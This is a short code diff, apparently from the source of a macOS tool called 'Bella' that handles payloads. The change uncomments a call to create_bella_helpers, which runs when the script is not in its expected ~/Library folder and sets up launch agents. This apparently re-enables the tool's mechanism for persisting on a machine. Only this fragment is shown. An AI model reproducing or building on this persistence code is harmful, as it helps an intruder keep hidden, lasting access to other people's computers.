@@ -2241,7 +2241,7 @@ else:
 if '/'.join(os.path.abspath(__file__).split('/')[:-1]).lower() != ('%s/Library/%s' % (home_path, bella_folder)).lower(): #then set up and load agents, etc
 	print '[%s], [%s]' % ('/'.join(os.path.abspath(__file__).split('/')[:-1]).lower(), ('%s/Library/%s' % (home_path, bella_folder)).lower())
 	print 'Bella is not in the proper folder. Resetting'
-	#create_bella_helpers(launch_agent_name, bella_folder, home_path)
+	create_bella_helpers(launch_agent_name, bella_folder, home_path)
 
 helper_location = '/'.join(os.path.abspath(__file__).split('/')[:-1]) + '/'
 payload_list = []
